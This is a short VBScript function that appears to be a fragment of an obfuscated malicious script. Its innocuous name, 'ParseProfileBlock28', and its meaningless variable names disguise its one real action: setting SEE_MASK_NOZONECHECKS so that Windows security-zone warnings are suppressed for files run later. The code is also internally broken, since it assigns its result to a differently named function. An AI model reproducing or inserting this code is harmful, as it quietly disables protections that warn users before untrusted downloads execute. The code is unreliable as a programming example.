Function ParseProfileBlock28()
On Error Resume Next
  Dim strData5,blnReady985,strManifestRaw83
  Set strData5=CreateObject("WScript.Shell")
  blnReady985=strData5.ExpandEnvironmentStrings("%TEMP%")
  strManifestRaw83=strData5.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(blnReady985)>0 And Len(strManifestRaw83)>0 Then
    strData5.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    DecodeManifest81=1
    Exit Function
  End If
  DecodeManifest81=0
End Function

